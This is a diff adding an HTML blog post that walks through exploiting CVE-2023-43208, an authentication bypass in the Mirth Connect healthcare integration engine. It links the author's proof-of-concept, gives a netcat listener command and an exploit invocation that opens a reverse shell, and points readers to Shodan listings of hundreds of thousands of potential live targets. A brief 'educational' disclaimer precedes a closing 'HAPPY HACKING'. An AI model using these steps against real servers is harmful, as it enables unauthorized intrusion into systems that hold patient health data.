@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta charset="utf-8" />
+		<link rel="stylesheet" type="text/css" href="css/style.css" />
+		<title>Mirth Connect RCE: When Healthcare Data Meets Insecure Defaults.</title>
+	</head>
+<body>
+<h1>Mirth Connect RCE: When Healthcare Data Meets Insecure Defaults.</h1>
+
+<h2>From version detection to reverse shell: exploiting critical vulnerabilities in Mirth Connect.</h2>
+
+<p><strong> What is Mirth Connect?</strong></p>
+
+<p>Mirth Connect is a healthcare integration engine developed by NextGen Healthcare that streamlines the exchange of health information by transforming and routing data in various formats like HL7 and DICOM between different healthcare systems. </p>
+
+<p><strong> Now that we understand Mirth Connect&#39;s role in healthcare, let&#39;s dive into the exploitation process.</strong></p>
+
+<p>Before we start hacking, let’s explain CVE-2023-43208.</p>
+
+<p>CVE-2023-43208 is a critical authentication bypass vulnerability in Mirth Connect that allows unauthenticated attackers to access the administrative interface and potentially execute arbitrary code.</p>
+
+<p><strong> What are the affected versions?</strong></p>
+
+<p>Mirth Connect versions prior to 4.4.0, it specifically affects versions 4.1.1, 4.2.0, 4.3.0 and earlier.</p>
+
+<h2><strong> The Vulnerability</strong></h2>
+
+<p>The vulnerability exists in the authentication mechanism, the application fails to properly validate sessions tokens, this means that attackers can access the admin functions without any credentials.</p>
+
+<h2>Exploitation steps</h2>
+
+<p>I wrote a PoC that can check a single target and a list of targets for vulnerabilities.</p>
+
+<p>You can download it here: <a href="https://github.com/gotr00t0day/NextGen-Mirth-Connect-Exploit">https://github.com/gotr00t0day/NextGen-Mirth Connect-Exploit</a></p>
+
+<figure><img src="Images/mirth_poc.png"/></figure>
+
+<p>As you can see in the picture above, I found a few Mirth Connect servers that might be vulnerable to CVE-2023-43208.</p>
+
+<p>From here you can try and access the admin interface without creds at /api/users. Or you can try and use the exploit and get a reverse shell.</p>
+
+<p>If you use the exploit, for a reverse shell, make sure you use the proper flags and arguments.</p>
+
+<p><strong>Start a nectar listener</strong>: nc -lvp 1337</p>
+
+<p><strong>Run the PoC</strong>: </p>
+
+<p>python3 mirthconnect<em>exploit.py -t IP-p PORT -lh localhost -lp 1337 --exploit</em></p>
+
+<p>If you’re lucky, you should see a connection back on your netcat listener.</p>
+
+<h2>Finding vulnerable servers in shodan</h2>
+
+<figure><img src="Images/mirth_shodan.png"/></figure>
+
+<p>As you can see in the image above, there are 272,724 potential targets, a lot of these are running vulnerable versions.</p>
+
+<h3>This blog was created to expose critical vulnerabilities and demonstrate the dangers when system administrators fail to properly patch their applications, highlighting the significant risks this poses. This research is conducted for educational and awareness purposes.</h3>
+
+<h1>HAPPY HACKING</h1>
+
+</body>
+</html>
+
